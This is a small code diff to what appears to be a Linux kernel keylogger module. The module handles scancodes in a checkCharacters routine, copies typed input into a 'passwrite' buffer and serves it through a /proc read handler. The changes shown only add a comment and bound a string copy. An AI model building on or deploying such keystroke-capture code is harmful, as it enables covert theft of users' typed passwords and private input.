@@ -32,7 +32,7 @@ ssize_t read_proc(struct file* filp, char *buf, size_t count, loff_t *offp){
 	return strlen(message);
 }
 */
-
+//check the function at the begn of the loop and make a continuous function
 ssize_t read_proc(struct file* filp, char *buf, size_t count, loff_t *offp)
 {
 	if(keypress == 1){
@@ -137,7 +137,8 @@ void checkCharacters(int button, int shift, int down)
 	found = false;
 	if (down == 1 && shift == 0)
 	{	
-		strcpy(passwrite[passcount2],input);
+		input[15] = 10;
+		strncpy(passwrite[passcount2],input,16);
 		switch (button)
 		{
 			case 30:
